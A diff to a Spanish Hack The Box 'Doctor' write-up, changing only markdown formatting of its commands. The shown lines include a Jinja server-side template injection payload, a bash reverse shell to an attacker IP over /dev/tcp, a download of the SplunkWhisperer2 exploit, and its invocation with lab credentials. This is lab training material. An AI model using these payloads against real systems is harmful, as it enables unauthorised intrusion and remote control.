@@ -50,7 +50,7 @@ Busco información acerca de como explotar flask y encuentro lo siguiente:
 Parece ser que se puede explotar una vulnerabilidad llamada `Server Side Template Injection`.
 Éstos links ayudan a entender la vulnerabilidad, y en el último link veo que se pueden ejecutar comandos con ésta inyección:
 ```bash
-{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+\{\{request.application.__globals__.__builtins__.__import__('os').popen('id').read()\}\}
 ```
 Creo un mensaje que contenga la inyección en el título
 
@@ -63,7 +63,7 @@ Y accedo a la página archive, y en el código fuente aparece lo siguiente:
 Tengo ejecución de comandos!
 Cambio el título y pongo lo siguiente para la reverse shell:
 
-```python
+```bash
 \{\{request.application.__globals__.__builtins__.__import__('os').popen("bash -c 'bash -i >& /dev/tcp/10.10.15.94/4444 0>&1'").read()\}\}
 ```
 ![](/assets/images/Doctor-Hackthebox/doctor-reverse.png)
@@ -92,7 +92,9 @@ Buscando en internet por “splunk privilege escalation” encuentro esto:
 
 Me descargo la versión python para ejecución remota de esta forma:
 
-`wget https://raw.githubusercontent.com/cnotin/SplunkWhisperer2/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py`
+```bash
+wget https://raw.githubusercontent.com/cnotin/SplunkWhisperer2/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py
+```
 
 Viendo la página del proyecto observo que por defecto se ejecuta un calc.exe como payload. Lo cambio por una reverse shell en bash de pentestmonkey así:
 
@@ -252,7 +254,9 @@ print("Bye!")
 Se puede poner el host, port, username y password o también se le pueden pasar como argumento al script.
 Me pongo a la escucha y ejecuto el script para recibir la shell.
 
-`python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --lhost 10.10.15.105 --username shaun --password Guitar123`
+```bash
+python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --lhost 10.10.15.105 --username shaun --password Guitar123
+```
 
 ![](/assets/images/Doctor-Hackthebox/doctor-root.png)
 
